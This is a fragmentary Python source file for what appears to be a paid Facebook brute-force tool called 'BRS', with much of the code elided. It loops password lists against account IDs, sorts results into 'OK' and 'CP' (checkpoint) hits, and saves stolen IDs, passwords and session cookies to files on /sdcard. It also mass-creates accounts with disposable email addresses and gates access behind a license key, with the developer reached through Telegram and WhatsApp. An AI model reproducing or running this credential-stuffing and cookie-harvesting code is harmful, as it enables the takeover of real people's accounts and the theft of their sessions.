        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [BRS-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DOD/BRS-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/BRS/BRS-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [BRS-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/BRS/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BRS/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [BRS-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BRS/LAHJBRS-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [BRS-CREATE] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [BRS-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
                 open("/sdcard/BRS/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/.BRS.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/.BRS.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python BRS.py')
    ...
    r1 = requests.get('https://raw.githubusercontent.com/Yfhtddggff/mafia12/main/mafia13.txt').text
    ...
    if key1 in r1:
        ...
        print(' Paid tools, please contact the developer \n Yours Telegram developer @q18_7  \n Flexible or future payment methods  ');linex()
        input(' \033[1;37mPress Enter To send key Admin')
        tks = ('Hello%20DOD%20Owner%20MUGHAL-XD%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213775434920?text='+tks)
        main_apv()
main_apv()
